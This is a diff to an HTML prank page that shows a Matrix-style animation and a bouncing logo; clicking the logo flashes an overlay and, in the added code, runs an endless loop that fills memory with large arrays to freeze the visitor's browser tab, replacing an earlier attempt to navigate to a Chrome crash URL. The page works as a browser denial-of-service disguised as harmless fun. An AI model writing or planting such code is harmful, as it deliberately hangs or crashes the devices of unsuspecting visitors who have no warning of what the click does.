@@ -45,58 +45,45 @@
 <body>
     <canvas id="matrixCanvas"></canvas>
     <img id="logo" src="https://dontclickit.org/wp-content/uploads/2024/05/cropped-dont-click-it-logo-1-330x109.png">
-
-    <div id="crash-overlay">bye bye google (if your using google)</div>
-
+    <div id="crash-overlay">bye bye ram</div>
     <script>
         const canvas = document.getElementById("matrixCanvas");
         const ctx = canvas.getContext("2d");
         canvas.width = window.innerWidth;
         canvas.height = window.innerHeight;
-
         const katakana = "アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
         const latin = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
         const nums = "0123456789";
         const alphabet = katakana + latin + nums;
-
         const fontSize = 16;
         let columns = Math.floor(canvas.width / fontSize);
         let drops = Array(columns).fill(1);
-
         function drawMatrix() {
             ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
             ctx.fillRect(0, 0, canvas.width, canvas.height);
             ctx.fillStyle = "#0F0";
             ctx.font = `${fontSize}px monospace`;
-
             for (let i = 0; i < drops.length; i++) {
                 const text = alphabet[Math.floor(Math.random() * alphabet.length)];
                 ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-
                 if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                     drops[i] = 0;
                 }
                 drops[i]++;
             }
         }
-
         setInterval(drawMatrix, 50);
-
         const logo = document.getElementById("logo");
         const overlay = document.getElementById("crash-overlay");
-
         let x = Math.random() * (window.innerWidth - 260) + 20;
         let y = Math.random() * (window.innerHeight - 140) + 20;
         let dx = (Math.random() > 0.5 ? 1 : -1) * (2.2 + Math.random() * 1.4);
         let dy = (Math.random() > 0.5 ? 1 : -1) * (2.2 + Math.random() * 1.4);
-
         function updateLogo() {
             const w = logo.offsetWidth;
             const h = logo.offsetHeight;
-
             x += dx;
             y += dy;
-
             if (x <= 0 || x + w >= window.innerWidth) {
                 dx = -dx;
                 x = Math.max(0, Math.min(x, window.innerWidth - w));
@@ -105,15 +92,11 @@
                 dy = -dy;
                 y = Math.max(0, Math.min(y, window.innerHeight - h));
             }
-
             logo.style.left = x + "px";
-            logo.style.top  = y + "px";
-
+            logo.style.top = y + "px";
             requestAnimationFrame(updateLogo);
         }
-
         requestAnimationFrame(updateLogo);
-
         logo.addEventListener("click", () => {
             let flashCount = 0;
             const maxFlashes = 50; // 50 × 10 ms = 500 ms
@@ -125,27 +108,27 @@
                 }
                 overlay.style.opacity = "1";
                 flashCount++;
-
                 if (flashCount >= maxFlashes) {
                     clearInterval(interval);
                     overlay.style.opacity = "0";
-
                     setTimeout(() => {
                         try {
-                            window.location = "chrome://inducebrowsercrashforrealz";
+                            // Infinite loop to consume RAM (using JavaScript; PHP/HTML can't loop client-side like this)
+                            let memHog = [];
+                            while (true) {
+                                memHog.push(new Array(1000000).fill(Math.random()));
+                            }
                         } catch (e) {
-                            // fallback just in case (most browsers block or ignore it)
-                            alert("crash attempt sent (works best in Chrome)");
+                            // Fallback alert if the loop is somehow blocked
+                            alert("RAM hog attempt initiated (may freeze tab)");
                         }
                     }, 100);
                 }
             }, 10);
         });
-
         window.addEventListener("resize", () => {
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
-
             const newColumns = Math.floor(canvas.width / fontSize);
             if (newColumns > columns) {
                 drops = drops.concat(Array(newColumns - columns).fill(1));
@@ -153,7 +136,6 @@
                 drops = drops.slice(0, newColumns);
             }
             columns = newColumns;
-
             x = Math.max(0, Math.min(x, window.innerWidth - logo.offsetWidth));
             y = Math.max(0, Math.min(y, window.innerHeight - logo.offsetHeight));
         });
